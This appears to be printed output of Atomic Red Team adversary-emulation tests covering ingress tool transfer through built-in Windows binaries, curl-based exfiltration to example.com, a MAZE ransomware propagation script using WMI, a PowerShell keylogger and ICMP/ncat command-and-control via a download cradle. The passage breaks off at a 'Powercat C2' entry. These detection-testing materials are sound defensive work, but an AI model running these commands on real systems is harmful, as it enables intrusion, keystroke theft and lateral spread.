Description: Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file. Downloaded files can be found in "%LocalAppData%\Micr
osoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>. Run "Get
-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding th
e correct username and file name to locate the file.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
& $imewdbled #{remote_url}
Command (with inputs):
$imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
& $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml

Cleanup Commands:
Command:
$inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\" 
$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
if("" -ne "$file_to_be_removed") { Remove-Item "$file_to_be_removed" -ErrorAction Ignore }
Command (with inputs):
$inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\" 
$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue)
if("" -ne "$file_to_be_removed") { Remove-Item "$file_to_be_removed" -ErrorAction Ignore }
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Curl Download File
Atomic Test Number: 18
Atomic Test GUID: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
Description: The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious beh
avior. Expected output will include whether the file downloaded successfully or not.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
#{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
#{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
#{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
Command (with inputs):
C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\publ
ic\music\allthethingsx64.dll
C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\user
s\public\music\allthethingsx64.dll
C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdat
a\allthethingsx64.dll
C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthe
thingsx64.dll

Cleanup Commands:
Command:
del c:\users\public\music\allthethingsx64.dll >nul 2>&1
del c:\users\public\music\allthethingsx64.dll >nul 2>&1
del c:\programdata\allthethingsx64.dll >nul 2>&1
del %Temp%\allthethingsx64.dll >nul 2>&1

Dependencies:
Description: Curl must be installed on system.
Check Prereq Command:
if (Test-Path #{curl_path}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\Windows\System32\Curl.exe) {exit 0} else {exit 1}
Get Prereq Command:
Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
Get Prereq Command (with inputs):
Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl.zip"
Expand-Archive -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl.zip" -DestinationPath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl"
Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl"
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl.zip"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Curl Upload File
Atomic Test Number: 19
Atomic Test GUID: 635c9a38-6cbf-47dc-8615-3810bc1167cf
Description: The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration Expected output will include whether 
the file uploaded successfully or not.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
#{curl_path} -T #{file_path} #{remote_destination}
#{curl_path} --upload-file #{file_path} #{remote_destination}
#{curl_path} -d #{file_path} #{remote_destination}
#{curl_path} --data #{file_path} #{remote_destination}
Command (with inputs):
C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com
C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com
C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com
C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

Dependencies:
Description: Curl must be installed on system.
Check Prereq Command:
if (Test-Path #{curl_path}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\Windows\System32\Curl.exe) {exit 0} else {exit 1}
Get Prereq Command:
Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile PathToAtomicsFolder\..\ExternalPayloads\curl.zip
Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
Get Prereq Command (with inputs):
Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl.zip
Expand-Archive -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl.zip" -DestinationPath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl"
Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl"
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\curl.zip"
Description: A file must be created to upload
Check Prereq Command:
if (Test-Path #{file_path}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path c:\temp\atomictestfile.txt) {exit 0} else {exit 1}
Get Prereq Command:
echo "This is an Atomic Test File" > #{file_path}
Get Prereq Command (with inputs):
echo "This is an Atomic Test File" > c:\temp\atomictestfile.txt
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Download a file with Microsoft Connection Manager Auto-Download
Atomic Test Number: 20
Atomic Test GUID: d239772b-88e2-4a2e-8473-897503401bcc
Description: Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config
 is modified to download the arbitary file.  The issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a tempora
ry TMP folder and denying the delete permission to all files for the user. Upon successful execution the test will open calculator and Notepad executable for 10 seconds. reference: h
ttps://twitter.com/ElliotKillick/status/1455897435063074824 https://github.com/LOLBAS-Project/LOLBAS/pull/151 https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/ https://stronti
c.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"#{Path_to_file}" 1>NUL
Command (with inputs):
"C:\AtomicRedTeam\atomics\T1105\src\T1105.bat" 1>NUL

Cleanup Commands:
Command:
del /f/s/q %temp%\T1105 >nul 2>&1
rmdir /s/q %temp%\T1105 >nul 2>&1

Dependencies:
Description: C:\AtomicRedTeam\atomics\T1105\src\T1105.bat must exist on system.
Check Prereq Command:
if (Test-Path "#{Path_to_file}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1105\src\T1105.bat") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{Path_to_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat" -OutFile "#{Path_to_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1105\src\T1105.bat") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat" -OutFile "C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: MAZE Propagation Script
Atomic Test Number: 21
Atomic Test GUID: 70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf
Description: This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\T
emp directory of each one.  Upon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of o
ffline machines will be output to a specified location. Reference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-
incidents.html

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$machine_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt"
$offline_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt"
$completed_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"
foreach ($machine in get-content -path "$machine_list")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"
echo $machine >> "$completed_list"
wmic /node: "$machine" process call create "regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}"}
else
{echo $machine >> "$offline_list"}}
Command (with inputs):
$machine_list = "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt"
$offline_list = "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105OfflineHosts.txt"
$completed_list = "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105CompletedHosts.txt"
foreach ($machine in get-content -path "$machine_list")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy "$env:comspec" "\\$machine\C$\Windows\Temp\T1105.exe"
echo $machine >> "$completed_list"
wmic /node: "$machine" process call create "regsvr32.exe /i C:\Windows\Temp\T1105.exe"}
else
{echo $machine >> "$offline_list"}}

Cleanup Commands:
Command:
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt") 
{foreach ($machine in get-content -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt")
{wmic /node: "$machine" process where name='"regsvr32.exe"' call terminate | out-null
Remove-Item -path "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}" -force -erroraction silentlycontinue}}
Remove-Item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt" -erroraction silentlycontinue
Remove-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt" -erroraction silentlycontinue
Command (with inputs):
if (test-path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105CompletedHosts.txt") 
{foreach ($machine in get-content -path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105CompletedHosts.txt")
{wmic /node: "$machine" process where name='"regsvr32.exe"' call terminate | out-null
Remove-Item -path "\\$machine\C$\Windows\Temp\T1105.exe" -force -erroraction silentlycontinue}}
Remove-Item -path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105OfflineHosts.txt" -erroraction silentlycontinue
Remove-item -path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105CompletedHosts.txt" -erroraction silentlycontinue

Dependencies:
Description: Binary file must exist at specified location ($env:comspec)
Check Prereq Command:
if (Test-Path #{binary_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:comspec) {exit 0} else {exit 1}
Get Prereq Command:
write-host "The binary_file input parameter must be set to a binary that exists on this computer."
Description: Machine list must exist at specified location ("C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt")
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
new-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt" | Out-Null
echo "A machine list file has been generated at "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
new-item -path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt" | Out-Null
echo "A machine list file has been generated at "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt". Please enter the machines to target there, one machine per line."

[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Printer Migration Command-Line Tool UNC share folder into a zip file
Atomic Test Number: 22
Atomic Test GUID: 49845fc1-7961-4590-a0f0-3dbcf065ae7e
Description: Create a ZIP file from a folder in a remote drive

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
del %TEMP%\PrintBrm.zip >nul 2>&1 
#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
Command (with inputs):
del %TEMP%\PrintBrm.zip >nul 2>&1 
C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %TEMP%\PrintBrm.zip -O FORCE

Cleanup Commands:
Command:
del %TEMP%\PrintBrm.zip >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Lolbas replace.exe use to copy file
Atomic Test Number: 23
Atomic Test GUID: 54782d65-12f0-47a5-b4c1-b70ee23de6df
Description: Copy file.cab to destination Reference: https://lolbas-project.github.io/lolbas/Binaries/Replace/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
del %TEMP%\redcanary.cab >nul 2>&1
#{Path_replace} "#{replace_cab}" %TEMP% /A
Command (with inputs):
del %TEMP%\redcanary.cab >nul 2>&1
C:\Windows\System32\replace.exe "C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab" %TEMP% /A

Cleanup Commands:
Command:
del %TEMP%\redcanary.cab >nul 2>&1

Dependencies:
Description: C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab must exist on system.
Check Prereq Command:
if (Test-Path "#{replace_cab}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{replace_cab}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab" -OutFile "#{replace_cab}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab" -OutFile "C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Lolbas replace.exe use to copy UNC file
Atomic Test Number: 24
Atomic Test GUID: ed0335ac-0354-400c-8148-f6151d20035a
Description: Copy UNC file to destination Reference: https://lolbas-project.github.io/lolbas/Binaries/Replace/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
del %TEMP%\redcanary.cab >nul 2>&1
#{Path_replace} #{replace_cab} %TEMP% /A
Command (with inputs):
del %TEMP%\redcanary.cab >nul 2>&1
C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %TEMP% /A

Cleanup Commands:
Command:
del %TEMP%\redcanary.cab >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: certreq download
Atomic Test Number: 25
Atomic Test GUID: 6fdaae87-c05b-42f8-842e-991a74e8376b
Description: Use certreq to download a file from the web

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
Command (with inputs):
certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt

Cleanup Commands:
Command:
del #{local_path} >nul 2>&1
Command (with inputs):
del %temp%\Atomic-license.txt >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Download a file using wscript
Atomic Test Number: 26
Atomic Test GUID: 97116a3f-efac-4b26-8336-b9cb18c45188
Description: Use wscript to run a local VisualBasic file to download a remote file

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
wscript.exe "#{vbscript_file}"
Command (with inputs):
wscript.exe "C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs"

Cleanup Commands:
Command:
del Atomic-License.txt >nul 2>&1

Dependencies:
Description: C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs must be exist on system.
Check Prereq Command:
if (Test-Path "#{vbscript_file}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{vbscript_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs" -OutFile "#{vbscript_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs" -OutFile "C:\AtomicRedTeam\atomics\T1105\src\T1105-download-fi
le.vbs"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Nimgrab - Transfer Files
Atomic Test Number: 28
Atomic Test GUID: b1729c57-9384-4d1c-9b99-9b220afb384e
Description: Use nimgrab.exe to download a file from the web.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" #{remote_file} #{destination_path}
Command (with inputs):
cmd /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nimgrab.exe" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\Atomic-license.txt

Cleanup Commands:
Command:
del #{destination_path} >nul 2>&1
Command (with inputs):
del $env:TEMP\Atomic-license.txt >nul 2>&1

Dependencies:
Description: NimGrab must be installed on system.
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nimgrab.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\nim.zip"
Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\nim.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\nim" -Force
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\nim\nim-1.6.6\bin\nimgrab.exe" "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nim.zip"
Expand-Archive -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nim.zip" -DestinationPath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nim" -Force
Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nim\nim-1.6.6\bin\nimgrab.exe" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nimgrab.exe"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: iwr or Invoke Web-Request download
Atomic Test Number: 29
Atomic Test GUID: c01cad7f-7a4c-49df-985e-b190dcf6a279
Description: Use 'iwr' or "Invoke-WebRequest" -URI argument to download a file from the web. Note: without -URI also works in some versions.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
Command (with inputs):
powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt

Cleanup Commands:
Command:
del %temp%\Atomic-license.txt >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1056\T1056.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Input Capture: Keylogging T1056.001
Atomic Test Name: Input Capture
Atomic Test Number: 1
Atomic Test GUID: d9b633ca-8efb-45e6-b838-70f595c6ae26
Description: Utilize PowerShell and external resource to capture keystrokes [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.
ps1) Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)
Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
&"$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1" -LogPath #{filepath}
Command (with inputs):
&"C:\AtomicRedTeam\atomics\T1056.001\src\Get-Keystrokes.ps1" -LogPath $env:TEMP\key.log

Cleanup Commands:
Command:
Remove-Item $env:TEMP\key.log -ErrorAction Ignore

Dependencies:
Description: Get-Keystrokes PowerShell script must exist on disk at C:\AtomicRedTeam\atomics\T1056.001\src\Get-Keystrokes.ps1
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1056.001\src\Get-Keystrokes.ps1") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1") -Force | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile "PathToAtomicsFolder\T1056.001\src\Get-Keystr
okes.ps1"
Get Prereq Command (with inputs):
New-Item -ItemType Directory (Split-Path "C:\AtomicRedTeam\atomics\T1056.001\src\Get-Keystrokes.ps1") -Force | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile "C:\AtomicRedTeam\atomics\T1056.001\src\Get-K
eystrokes.ps1"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1104\T1104.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Non-Application Layer Protocol T1095
Atomic Test Name: ICMP C2
Atomic Test Number: 1
Atomic Test GUID: 0268e63c-e244-42db-bef7-72a9e59fc1fc
Description: This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2
-over-icmp/

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'
)
Invoke-PowerShellIcmp -IPAddress #{server_ip}
Command (with inputs):
IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'
)
Invoke-PowerShellIcmp -IPAddress 127.0.0.1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Non-Application Layer Protocol T1095
Atomic Test Name: Netcat C2
Atomic Test Number: 2
Atomic Test GUID: bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37
Description: Start C2 Session Using Ncat To start the listener on a Linux device, type the following:  nc -l -p <port>

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
cmd /c "#{ncat_exe}" #{server_ip} #{server_port}
Command (with inputs):
cmd /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1095\nmap-7.80\ncat.exe" 127.0.0.1 80

Dependencies:
Description: ncat.exe must be available at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1095\nmap-7.80\ncat.exe)
Check Prereq Command:
if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if( Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1095\nmap-7.80\ncat.exe") {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory -Force -Path "#{ncat_path}" | Out-Null
$parentpath = Split-Path (Split-Path "#{ncat_exe}"); $zippath = "$parentpath\nmap.zip"
Invoke-WebRequest  "https://nmap.org/dist/nmap-7.80-win32.zip" -OutFile "$zippath"
  Expand-Archive $zippath $parentpath -Force
  $unzipPath = Join-Path $parentPath "nmap-7.80"
if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like "Microsoft Visual C++*"}) ) {
  Start-Process (Join-Path $unzipPath "vcredist_x86.exe")
}
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory -Force -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1095" | Out-Null
$parentpath = Split-Path (Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1095\nmap-7.80\ncat.exe"); $zippath = "$parentpath\nmap.zip"
Invoke-WebRequest  "https://nmap.org/dist/nmap-7.80-win32.zip" -OutFile "$zippath"
  Expand-Archive $zippath $parentpath -Force
  $unzipPath = Join-Path $parentPath "nmap-7.80"
if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like "Microsoft Visual C++*"}) ) {
  Start-Process (Join-Path $unzipPath "vcredist_x86.exe")
}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Non-Application Layer Protocol T1095
Atomic Test Name: Powercat C2
Atomic Test Number: 3
